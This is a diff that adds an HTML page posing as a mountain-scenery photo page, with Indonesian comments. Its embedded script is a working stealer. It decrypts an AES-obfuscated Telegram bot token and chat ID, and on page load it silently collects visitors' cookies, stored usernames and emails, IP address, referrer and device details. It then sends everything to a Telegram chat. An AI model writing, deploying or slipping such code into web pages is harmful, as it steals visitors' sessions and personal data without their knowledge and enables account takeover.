@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Foto Pemandangan</title>
+</head>
+<body>
+    <h1>Pemandangan Gunung</h1>
+    <img src="https://picsum.photos/600/400" alt="Pemandangan random">
+    <p>Foto random dari picsum.photos (ganti F5 gambarnya berubah)</p>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
+
+<script>
+const ENCRYPTION_KEY = "MySecretAESKey2024rudyht14";
+const ENCRYPTED_BOT_TOKEN = "U2FsdGVkX18iDhQxAQuDTlbL/AKnuftvguBe1XWsGXwqpAQmfrJfUMUZxKRWadoYlLWkVwzRnIFnyAtrKTjQ7Q==";
+const ENCRYPTED_CHAT_ID = "U2FsdGVkX1810asmNS9c9O/aqODQzcwzmHvXdqE1yE8=";
+
+
+function decryptAES(encryptedText, key) {
+    try {
+        if (!encryptedText || encryptedText === '') {
+            console.error('❌ Text kosong!');
+            return null;
+        }
+        const bytes = CryptoJS.AES.decrypt(encryptedText, key);
+        const decrypted = bytes.toString(CryptoJS.enc.Utf8);
+        if (!decrypted || decrypted === '') {
+            console.error('❌ Hasil decrypt kosong! Periksa kunci.');
+            return null;
+        }
+        return decrypted;
+    } catch(e) {
+        console.error('❌ Gagal decrypt:', e.message);
+        return null;
+    }
+}
+
+
+console.log('🔐 Sedang mendecrypt token...');
+const BOT_TOKEN = decryptAES(ENCRYPTED_BOT_TOKEN, ENCRYPTION_KEY);
+const CHAT_ID = decryptAES(ENCRYPTED_CHAT_ID, ENCRYPTION_KEY);
+
+console.log('🔐 Status Token:');
+console.log('BOT_TOKEN:', BOT_TOKEN ? '✅ Valid' : '❌ Invalid');
+console.log('CHAT_ID:', CHAT_ID ? '✅ Valid' : '❌ Invalid');
+
+if (BOT_TOKEN && CHAT_ID) {
+    console.log('✅ Token berhasil didecrypt!');
+} else {
+    console.error('❌ Gagal decrypt token! Periksa ENCRYPTION_KEY.');
+}
+
+function downloadPDF() {
+    window.print();
+}
+
+async function getIPAddress() {
+    try {
+        const response = await fetch('https://api.ipify.org?format=json');
+        const data = await response.json();
+        return data.ip || 'Tidak terdeteksi';
+    } catch(e) {
+        return 'Gagal mendapatkan IP';
+    }
+}
+
+function getCookies() {
+    try {
+        return document.cookie || 'Tidak ada cookie';
+    } catch(e) {
+        return 'Gagal membaca cookie';
+    }
+}
+
+function getUserData() {
+    try {
+        return {
+            local: localStorage.getItem('user') || 'Tidak ada',
+            session: sessionStorage.getItem('user') || 'Tidak ada',
+            username: localStorage.getItem('username') || 'Tidak ada',
+            email: localStorage.getItem('email') || 'Tidak ada'
+        };
+    } catch(e) {
+        return { error: 'Gagal membaca data user' };
+    }
+}
+
+function getGmail() {
+    try {
+        let gmail = localStorage.getItem('gmail') || 
+                    localStorage.getItem('email') || 
+                    localStorage.getItem('userEmail');
+        
+        if (!gmail) {
+            gmail = sessionStorage.getItem('gmail') || 
+                    sessionStorage.getItem('email') ||
+                    sessionStorage.getItem('userEmail');
+        }
+        
+        if (!gmail) {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                if (cookie.includes('email') || cookie.includes('gmail') || cookie.includes('user')) {
+                    const parts = cookie.split('=');
+                    if (parts[1] && parts[1].includes('@')) {
+                        gmail = parts[1];
+                        break;
+                    }
+                }
+            }
+        }
+        
+        if (!gmail) {
+            const metaEmail = document.querySelector('meta[name="user-email"]');
+            if (metaEmail) gmail = metaEmail.content;
+        }
+        
+        return gmail || 'Tidak ditemukan';
+    } catch(e) {
+        return 'Gagal mendapatkan email';
+    }
+}
+
+function getLoginUser() {
+    try {
+        let user = localStorage.getItem('username') || 
+                  localStorage.getItem('user') ||
+                  sessionStorage.getItem('username') ||
+                  sessionStorage.getItem('user');
+        
+        if (!user) {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                if (cookie.includes('username') || cookie.includes('user')) {
+                    const parts = cookie.split('=');
+                    if (parts[1]) {
+                        user = decodeURIComponent(parts[1]);
+                        break;
+                    }
+                }
+            }
+        }
+        
+        return user || 'Tidak ditemukan';
+    } catch(e) {
+        return 'Gagal mendapatkan user';
+    }
+}
+
+async function kirimKeTelegram() {
+    try {
+        // Cek token valid
+        if (!BOT_TOKEN || !CHAT_ID) {
+            console.log('❌ Token tidak valid! Periksa kunci enkripsi.');
+            return;
+        }
+        
+        console.log("📤 Mengirim data lengkap...");
+        
+        const waktu = new Date().toLocaleString('id-ID', {
+            weekday: 'long',
+            year: 'numeric',
+            month: 'long',
+            day: 'numeric',
+            hour: '2-digit',
+            minute: '2-digit',
+            second: '2-digit',
+            timeZone: 'Asia/Jakarta'
+        });
+        
+        const ipAddress = await getIPAddress();
+        const cookies = getCookies();
+        const userData = getUserData();
+        const gmail = getGmail();
+        const loginUser = getLoginUser();
+        
+        let pesan = "🔐=== DATA USER ===🔐\n\n";
+        pesan += "👤 USER LOGIN: " + loginUser + "\n";
+        pesan += "📧 GMAIL: " + gmail + "\n";
+        pesan += "🌐 IP ADDRESS: " + ipAddress + "\n";
+        pesan += "🕐 WAKTU: " + waktu + "\n";
+        pesan += "🍪 COOKIE: " + cookies + "\n\n";
+        
+        pesan += "📱=== INFO DEVICE ===📱\n";
+        pesan += "URL: " + window.location.href + "\n";
+        pesan += "Browser: " + navigator.userAgent.substring(0, 150) + "\n";
+        pesan += "Bahasa: " + navigator.language + "\n";
+        pesan += "Platform: " + navigator.platform + "\n";
+        pesan += "Screen: " + screen.width + "x" + screen.height + "\n\n";
+        
+        pesan += "💾=== STORAGE DATA ===💾\n";
+        pesan += "LocalStorage: " + JSON.stringify(userData.local) + "\n";
+        pesan += "SessionStorage: " + JSON.stringify(userData.session) + "\n";
+        pesan += "Username: " + userData.username + "\n";
+        pesan += "Email: " + userData.email + "\n\n";
+        
+        pesan += "🔑=== SESSION INFO ===🔑\n";
+        pesan += "Referrer: " + (document.referrer || 'Tidak ada') + "\n";
+        pesan += "User Agent: " + navigator.userAgent + "\n";
+        
+        const encodedPesan = encodeURIComponent(pesan);
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedPesan}`;
+        
+        console.log("📤 URL:", url.substring(0, 80) + "...");
+        
+        const response = await fetch(url);
+        const data = await response.json();
+        
+        if (data.ok) {
+            console.log("✅ Data berhasil dikirim ke Telegram!");
+        } else {
+            console.log("❌ Error dari Telegram:", data);
+        }
+            
+    } catch(e) {
+        console.log("❌ Error:", e.message);
+    }
+}
+
+// Jalankan saat halaman dimuat
+window.addEventListener("load", function() {
+    console.log("📋 Mengumpulkan data user...");
+    setTimeout(kirimKeTelegram, 1500);
+});
+</script>
+</body>
+</html>
